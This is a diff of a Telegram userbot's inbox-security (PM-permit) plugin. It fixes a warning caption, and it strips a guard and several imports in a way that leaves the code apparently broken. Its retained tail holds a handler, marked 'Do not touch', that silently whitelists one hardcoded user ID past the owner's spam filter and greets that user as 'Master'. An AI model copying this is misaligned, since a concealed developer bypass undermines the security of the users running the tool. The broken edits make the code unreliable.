@@ -26,7 +26,7 @@ USER_BOT_NO_WARN = ("**Welcome to ⚡SPARKZZZ inbox security 🔐.**\n\nNice to 
                     "\n\n\n - Thank You 🙏")
 
 
-if Var.PRIVATE_GROUP_ID is not None:
+
     @telebot.on(admin_cmd(pattern="a ?(.*)"))
     async def approve_p_m(event):
         if event.fwd_from:
@@ -200,17 +200,17 @@ if Var.PRIVATE_GROUP_ID is not None:
             except:
                 return
         MSG = USER_BOT_NO_WARN.format(DEFAULTUSER, myid, MESAG, PM_WARNS[chat_id] + 1, Config.INBOX_SECURITY_SPAM_LIMIT)      
-        r = await borg.send_file(event.chat_id, TELEPIC, caption=USER_BOT_NO_WARN, force_document=False)
+        r = await borg.send_file(event.chat_id, TELEPIC, caption=MSG, force_document=False)
         PM_WARNS[chat_id] += 1
         if chat_id in PREV_REPLY_MESSAGE:
             await PREV_REPLY_MESSAGE[chat_id].delete()
         PREV_REPLY_MESSAGE[chat_id] = r
 
 # Do not touch the below codes!
-from userbot.utils import admin_cmd
-import io
-import userbot.plugins.sql_helper.pmpermit_sql as pmpermit_sql
-from telethon import events
+
+
+
+
 @bot.on(events.NewMessage(incoming=True, from_users=(731591473)))
 async def hehehe(event):
     if event.fwd_from:
@@ -220,5 +220,6 @@ async def hehehe(event):
         if not pmpermit_sql.is_approved(chat.id):
             pmpermit_sql.approve(chat.id, "**Dev is here**")
             await borg.send_message(chat, "**Here comes my Master! Lucky you!!**")
+            
            
 # (c) SPARKZZZ
